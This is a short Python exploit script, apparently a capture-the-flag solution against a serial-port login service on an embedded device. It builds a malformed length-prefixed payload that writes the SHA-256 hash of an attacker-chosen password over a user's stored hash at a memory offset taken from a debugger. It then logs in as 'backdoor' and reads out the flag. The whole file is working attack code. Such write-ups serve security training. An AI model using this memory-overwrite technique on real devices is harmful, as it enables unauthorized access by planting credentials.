import serial
import hashlib

def read_until(tty,us):
    s=tty.readline()
    while not s.startswith(us):
        s=tty.readline()
    print s

pasw="pass1"
usrname="backdoor"

m=hashlib.sha256()
m.update(pasw)
pass_hash=m.digest()
if ("\n" in pass_hash):
    print "pass hash has 0x0a choose other one"
print "pass hash", pass_hash.encode('hex')

target_address=0x3023-0x22  #location of pass hash (backdoor user)
sp_base=0x3ebf 				#taked from debugger
addr_diff=sp_base-target_address

with serial.Serial('/dev/ttyUSB0',115200,timeout=1) as tty:
    tty.write("\n")
    read_until(tty,"Expected format:")
    
    n1=len(pass_hash)
    n2=addr_diff-len(str(n1))-len(":")-len(str(addr_diff))-len(":")-n1
    
    print "send payload "+str(n1)+":"+str(n2)+":"+repr(pass_hash)
    tty.write(str(n1)+":"+str(n2)+":"+pass_hash+"1\n")
    read_until(tty,"Unknown user")
    
    print "send pass: "+str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw
    tty.write(str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw+"\n")
    read_until(tty,"Your flag is")
    print tty.readline()
